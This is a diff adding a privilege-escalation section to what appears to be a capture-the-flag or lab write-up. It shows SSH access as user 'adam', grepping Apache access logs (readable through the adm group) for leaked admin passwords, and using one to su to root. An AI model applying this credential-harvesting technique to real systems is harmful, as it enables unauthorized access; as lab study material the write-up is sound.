@@ -92,3 +92,28 @@ Results
 | e07b04a6487acefafbd9b733914adc32 | adam     |
 +----------------------------------+----------+
 ```
+### SSH
+```
+ssh adam@10.10.110.45
+adam@10.10.110.45's password: 
+```
+Searching for permissions
+## ID
+```
+adam@DEV01-Ares:/etc/cron.daily$ id
+uid=1000(adam) gid=1000(adam) groups=1000(adam),4(adm)
+```
+Look at the /var/log/apache2
+```
+adam@DEV01-Ares:/var/log/apache2$ cat access.log.1 |grep password
+10.10.14.3 - - [03/Dec/2020:09:06:26 +0000] "GET /login/?username=admin&password=8NJxgU2CtVsJYZE5 HTTP/1.1" 200 625 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0"
+10.10.14.3 - - [03/Dec/2020:09:06:26 +0000] "GET /login/?username=admin&password=$@#G34123421 HTTP/1.1" 200 625 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0"
+```
+## su root
+```
+adam@DEV01-Ares:/var/log/apache2$ su root
+Password: 
+root@DEV01-Ares:/var/log/apache2# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
